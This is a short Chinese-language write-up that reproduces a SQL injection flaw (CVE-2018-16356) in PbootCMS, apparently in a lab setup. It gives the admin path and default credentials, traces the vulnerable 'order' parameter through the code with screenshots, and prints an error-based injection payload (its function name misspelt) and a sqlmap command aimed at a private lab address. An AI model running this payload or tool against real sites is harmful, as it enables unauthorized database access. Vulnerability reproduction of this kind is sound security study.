pbootcms SQL注入 （CVE-2018-16356）

描述: PbootCMS是一款使用PHP语言开发的开源企业建站内容管理系统（CMS）。 PbootCMS中存在SQL注入漏洞。该漏洞源于基于数据库的应用缺少对外部输入SQL语句的验证。攻击者可利用该漏洞执行非法SQL命令。 后台路径：/admin.php 用户名密码：admin:123456 授权码自行获取：https://www.pbootcms.com/freesn/

![image-20211027192715921](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20211027192715921.png)

填写到后台"全局配置>>配置参数"中



复现：

http://xxx/api.php/List/index?order=123

$order参数是我们可以控制的

![image-20211027193311859](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20211027193311859.png)

转到函数getList，该参数在函数顺序中使用

![image-20211027193422710](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20211027193422710.png)

再去看function order函数

![image-20211027193437644](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20211027193437644.png)





哦 记得去后台开启APi功能。还要禁用“强制api用户”，打开appid参数

不能不能sql注入

构造payload

/api.php/List/index?order=123 and (updatexm(1,concat(0x7e,(select user())),0))#

sqlmap -u http://192.168.1.192:30677/api.php/List/index?order=123

![image-20211027195025840](https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20211027195025840.png)